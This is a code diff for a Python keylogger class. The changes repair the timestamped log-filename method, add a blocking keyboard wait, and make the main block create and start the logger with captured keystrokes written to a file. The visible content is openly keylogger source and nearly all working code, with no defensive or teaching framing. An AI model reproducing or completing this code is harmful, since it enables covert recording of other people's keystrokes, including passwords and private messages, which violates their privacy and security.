@@ -76,16 +76,14 @@ class keylogger:
                 
         self.log += name
 
-        def update_filename(self):
-            start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":","")
+        
+            
             
             
     def update_filename(self):
-        with open(f"{self.filename}.txt", "w") as f:
-            print(self.log, file=f)
-            
-        print(f"[+] Saved {self.filename}.txt")
-        
+        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
+        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
+        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
     
     def report_to_file(self):
         with open(f"{self.filename}.txt", "w") as f:
@@ -122,10 +120,12 @@ class keylogger:
         self.report()
         
         print(f"{datetime.now()} - Started keylogger")
+        keyboard.wait()
         
             
 
 
 
 if __name__ == "__main__":
-    pass             
+    keyloger = keylogger(interval=SEND_REPORT_TIMING, report_method="file")
+    keyloger.start()             
